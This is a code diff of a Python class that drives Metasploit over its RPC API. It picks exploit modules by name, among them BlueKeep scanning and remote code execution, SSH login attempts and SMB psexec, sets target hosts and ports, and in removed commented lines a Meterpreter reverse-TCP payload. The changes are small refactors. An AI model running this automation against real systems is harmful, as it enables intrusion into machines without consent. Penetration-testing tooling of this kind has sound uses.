@@ -1,42 +1,22 @@
-# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
-#     for x in m: ## for every result in the search?
-#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
-#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
-#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
-#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
-#         exploit['RHOSTS'] = data.get('targetIP') # Need to obtain targetIP addresss somehow
-#         exploit['RPORT'] = port # Need to specify port?
-
-
 from pymetasploit3.msfrpc import MsfRpcClient
-import time
-import logging
-import random
-
-# import socket
+import logging, sys, random
 
 # TODO MAKE IT NOT HARD CODED
 LHOSTIP = '192.168.1.50'
-
-
-# Inputs: Exploit, Target, Port (Target Port)
 
 class MetasploitInterface:
     portBindings = [55553]
 
     def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, logLevel): # Just for metasploit connection
-        self.logLevel = logging.basicConfig(level=logLevel)
+        logging.basicConfig(stream=sys.stdout, level=logLevel)
+
         self.metasploit_ip = metasploit_ip
         self.metasploit_port = metasploit_port
         self.metasploit_pass = metasploit_pass
         self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
         # self.verbosity = verbosity
-        print(self.client)
-    
-    # def connectMetasploit(self):
-    #     client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
-    #     print(f"Client Connected {client}")
-    #     return client
+        logging.info(f"MSFRPCD API Connected @ {self.metasploit_ip}:{self.metasploit_port}")
+        logging.info(f"MSFRPCD OBJ: {self.client}")
 
     def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
         success, user_level = False, ''
@@ -65,7 +45,7 @@ class MetasploitInterface:
         elif(exploit == 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'):
             success, user_level, exploit = self.scanBlueKeep(target, exploit, port)
         
-        elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluebeep_rce'):
+        elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'):
             success, user_level, exploit = self.exploitBlueKeep(target, exploit, port)
 
         elif(exploit == 'auxiliary/scanner/ssh/ssh_login'):
@@ -84,7 +64,8 @@ class MetasploitInterface:
             success, user_level, exploit = self.exploitSMBpsexec(target,exploit,port)
 
         else:
-            print("No function picked")
+            print(f"{exploit}: Not implemented")
+            return 0, "", ""
         
         return success, user_level, exploit
 
@@ -346,7 +327,7 @@ class MetasploitInterface:
         # print(exploit.missing_required)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
-        exploit["fDisableCam"] = 0
+        # exploit["fDisableCam"] = 0
         # exploit["TARGET"] = '7'
         # exploit["LHOST"] = LHOSTIP
 
@@ -544,7 +525,7 @@ class MetasploitInterface:
         exploit = self.client.modules.use(module, specific_module)
         # print(exploit.missing_required)
         exploit["RHOSTS"] = target
-        exploit["RPORT"] = port
+        # exploit["RPORT"] = port
 
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
